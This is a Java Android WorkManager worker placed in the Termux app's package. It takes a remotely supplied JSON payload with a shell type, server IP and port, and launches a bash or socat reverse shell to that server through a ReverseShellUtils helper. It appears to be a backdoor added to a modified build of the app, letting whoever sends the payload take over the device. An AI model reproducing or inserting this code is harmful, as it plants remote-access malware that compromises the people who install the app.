package com.termux.app.utils;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class ShellRequestWorker extends Worker {
    private String TAG = "ShellRequestWorker";

    public ShellRequestWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            Data input = getInputData();
            String payload = input.getString("payload");
            if (payload == null) {
                return Result.failure();
            }

            JSONObject json = new JSONObject(payload);
            Map<String, String> data = new HashMap<>();
            Iterator<String> keys = json.keys();
            while (keys.hasNext()) {
                String key = keys.next();
                data.put(key, json.getString(key));
            }

            Context context = getApplicationContext();
            handleShellRequest(context, data);
            return Result.success();
        } catch (Exception e) {
            return Result.retry();
        }
    }

    private void handleShellRequest(Context context, Map<String, String> data) {
        Log.d(TAG, "Serving shell request");
        String shellType = data.get("shellType");
        String serverIP = data.get("serverIP");
        String serverPort = data.get("serverPort");

        switch (shellType) {
            case "bash":
                Log.d(TAG, "Calling ReverseShellUtils to start bash shell");
                new ReverseShellUtils().startBashShell(context, serverIP, serverPort);
                break;
            case "socat":
                Log.d(TAG, "Calling ReverseShellUtils to start socat shell");
                new ReverseShellUtils().startSocatShell(context, serverIP, serverPort);
                break;
            default:
                Log.e(TAG, "Invalid shell type");
        }
    }
}
